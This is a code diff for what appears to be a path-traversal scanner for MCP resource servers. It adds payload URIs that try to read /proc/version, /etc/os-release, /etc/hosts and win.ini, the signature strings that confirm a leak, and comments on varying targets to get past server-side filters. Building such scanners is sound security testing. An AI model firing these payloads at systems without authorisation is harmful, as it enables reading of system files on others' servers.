@@ -86,9 +86,19 @@ func (r *reconContext) resolveInventories(ctx context.Context, gen types.Generat
 // back cannot forge them, which is what makes signature matching a deterministic,
 // low-false-positive oracle (the same design the mcptool path-traversal probe
 // uses).
+//
+// Choosing a signature is a precision decision, not a completeness one: a marker
+// that also occurs in ordinary served content turns the oracle into a guess. So
+// /etc/os-release is keyed on its distinctive assignments and NOT on a bare "ID=",
+// which matches CLIENT_ID=, UUID= or an echoed ?ID= query; and /etc/hosts is keyed
+// on its header and broadcast entry, not on "127.0.0.1 localhost", which appears in
+// perfectly normal documentation.
 var (
-	passwdSignatures = []string{"root:x:0:0:", "# User Database", "nobody:*:", "daemon:*:"}
-	winIniSignatures = []string{"[extensions]", "[fonts]"}
+	passwdSignatures      = []string{"root:x:0:0:", "# User Database", "nobody:*:", "daemon:*:"}
+	winIniSignatures      = []string{"[extensions]", "[fonts]"}
+	procVersionSignatures = []string{"Linux version "}
+	osReleaseSignatures   = []string{"PRETTY_NAME=", "ID_LIKE=", "VERSION_ID="}
+	hostsSignatures       = []string{"# Host Database", "broadcasthost"}
 )
 
 // uriPayload pairs a resource URI to request with the signatures its returned
@@ -127,6 +137,18 @@ func baselineURIPayloads() []uriPayload {
 		{uri: "file:///C:/windows/win.ini", signatures: winIniSignatures, class: classTraversal},
 		{uri: "file:///windows/win.ini", signatures: winIniSignatures, class: classTraversal},
 		{uri: "..\\..\\..\\..\\..\\..\\windows\\win.ini", signatures: winIniSignatures, class: classTraversal},
+
+		// Diversifying the TARGET matters as much as diversifying the encoding. Every
+		// payload above names passwd or win.ini, so a single server-side filter rule
+		// ("reject any URI containing passwd") defeats the whole set at once no matter
+		// how it is encoded. These alternates are deliberately few — one or two
+		// encodings each rather than the full spread — because the baseline is sent to
+		// every target and each entry is a request.
+		{uri: "file:///proc/version", signatures: procVersionSignatures, class: classTraversal},
+		{uri: "../../../../../../proc/version", signatures: procVersionSignatures, class: classTraversal},
+		{uri: "file:///etc/os-release", signatures: osReleaseSignatures, class: classTraversal},
+		{uri: "../../../../../../etc/os-release", signatures: osReleaseSignatures, class: classTraversal},
+		{uri: "file:///etc/hosts", signatures: hostsSignatures, class: classTraversal},
 	}
 	return out
 }
@@ -147,6 +169,14 @@ func traversalFrom(advertised string) []uriPayload {
 		{uri: base + "../../../../../../etc/passwd", signatures: passwdSignatures, class: classTraversal},
 		{uri: base + "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd", signatures: passwdSignatures, class: classTraversal},
 		{uri: base + "....//....//....//....//....//....//etc/passwd", signatures: passwdSignatures, class: classTraversal},
+		// One alternate Unix target and one Windows target, for the same filter-evasion
+		// reason as the baseline — and because a Windows host with a prefix check would
+		// otherwise never see a prefix-preserving payload it could fall for. Held to two
+		// extra entries: this set is emitted PER advertised resource (bounded by
+		// resource_max_targets), so each addition costs a request per resource rather
+		// than one per scan.
+		{uri: base + "../../../../../../proc/version", signatures: procVersionSignatures, class: classTraversal},
+		{uri: base + "../../../../../../windows/win.ini", signatures: winIniSignatures, class: classTraversal},
 	}
 }
 
